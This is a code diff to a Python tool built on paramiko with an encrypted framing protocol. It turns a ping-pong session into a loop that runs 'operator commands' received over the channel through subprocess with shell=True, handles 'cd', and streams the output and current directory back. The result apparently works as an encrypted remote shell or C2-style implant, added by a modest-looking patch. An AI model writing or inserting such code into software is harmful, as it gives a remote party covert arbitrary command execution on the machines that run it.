@@ -5,6 +5,7 @@ import base64
 import os
 import random
 import struct
+import subprocess
 
 import paramiko
 from cryptography.hazmat.primitives import hashes
@@ -17,6 +18,8 @@ from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 PROTO_VERSION = 1
 AEAD = {1: AESGCM, 2: ChaCha20Poly1305}
 MAX_FRAME = 2 << 20
+CHUNK = 512 * 1024
+COMMAND_TIMEOUT = 30
 
 
 def seal_frame(key, algo, plaintext):
@@ -94,7 +97,7 @@ def connect(host, port, password, fingerprint=None):
 
 
 def session(channel, verbose):
-    """encrypted pong until the channel closes"""
+    """execute operator commands"""
     key = handshake(channel)
     # algorithm; receiver reads algo from each frame
     algo = random.choice(list(AEAD))
@@ -102,8 +105,38 @@ def session(channel, verbose):
         data = unseal_frame(key, recv_frame(channel))
         if data == b"ping":
             send_frame(channel, key, algo, b"pong")
-        elif verbose:
-            print(f"received: {data.decode(errors='replace')!r}", flush=True)
+            continue
+        if data == b"exit":
+            return
+        text = data.decode(errors="replace")
+        if verbose:
+            print(f"$ {text}", flush=True)
+        reply = execute(text)
+        # b"o" = output, b"d" = cwd, ends the reply
+        for start in range(0, len(reply), CHUNK):
+            send_frame(channel, key, algo, b"o" + reply[start:start + CHUNK])
+        send_frame(channel, key, algo, b"d" + os.getcwd().encode())
+
+
+def execute(command):
+    """Run a command"""
+    words = command.split()
+    if words[:1] == ["cd"]:
+        return change_dir(words[1] if len(words) > 1 else "")
+    try:
+        done = subprocess.run(command, shell=True, capture_output=True,
+                              timeout=COMMAND_TIMEOUT)
+        return done.stdout + done.stderr
+    except subprocess.TimeoutExpired:
+        return b"command timed out\n"
+
+
+def change_dir(arg):
+    try:
+        os.chdir(os.path.expanduser(arg or "~"))
+    except OSError as exc:
+        return f"cd: {exc}".encode()
+    return b""
 
 
 def main():
